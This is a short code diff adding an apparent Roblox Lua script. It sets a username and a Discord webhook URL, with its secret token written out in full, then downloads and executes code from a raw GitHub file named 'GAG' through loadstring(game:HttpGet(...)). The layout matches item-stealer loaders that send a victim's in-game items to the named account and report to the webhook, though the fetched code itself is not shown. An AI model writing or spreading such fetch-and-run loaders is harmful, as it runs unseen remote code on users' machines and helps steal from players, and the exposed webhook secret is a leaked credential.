@@ -1,0 +1,4 @@
+username = "Jake_me121"
+webhook = "https://discord.com/api/webhooks/1347860645999018015/rR80kqv9yaBebmP8riQKXJ5Wb7eibn42uL1vCzC02cxmHWTC7IpUa2UUY-zMTq1OtVyA"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/214scripts/main/refs/heads/main/GAG"))()
